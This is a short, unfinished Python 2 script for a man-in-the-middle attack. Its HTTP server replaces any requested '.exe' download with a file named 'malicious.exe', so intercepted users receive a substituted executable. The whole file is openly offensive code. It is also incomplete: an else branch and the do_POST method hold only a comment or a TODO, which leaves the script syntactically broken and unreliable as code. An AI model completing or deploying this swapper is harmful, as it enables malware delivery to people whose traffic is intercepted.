# inline file swapper for web MITM

import SocketServer
import SimpleHTTPServer
import urllib

PORT = 80

class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        # manages swapping exe files
        if self.path[:-4:-1] == "exe":
          self.path="/malicious.exe"
        else:
          # redirect appropriately
        return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
    def do_POST(self):
        # TODO


httpd = SocketServer.ForkingTCPServer(('', PORT), Proxy)
print "serving at port", PORT
httpd.serve_forever()
